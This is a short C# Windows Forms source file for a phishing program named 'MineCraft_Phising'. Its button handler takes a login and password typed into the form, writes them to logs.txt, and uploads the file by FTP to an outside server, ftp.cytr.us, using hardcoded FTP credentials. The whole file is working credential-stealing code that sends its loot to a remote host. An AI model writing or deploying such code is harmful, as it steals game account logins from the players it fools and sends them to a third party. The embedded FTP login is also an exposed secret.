using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MineCraft_Phising
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string login = textBox1.Text;
            string password = textBox2.Text;

            File.AppendAllText(@"logs.txt", $"Login: {login} Hasło: {password} \n");

            WebClient client = new WebClient();
            client.Credentials = new NetworkCredential("gigant13", "giganciprogramowania");
            client.UploadFile(
                "ftp://ftp.cytr.us/Ola/logs.txt",
                WebRequestMethods.Ftp.UploadFile,
                "logs.txt");


        }
    }
}
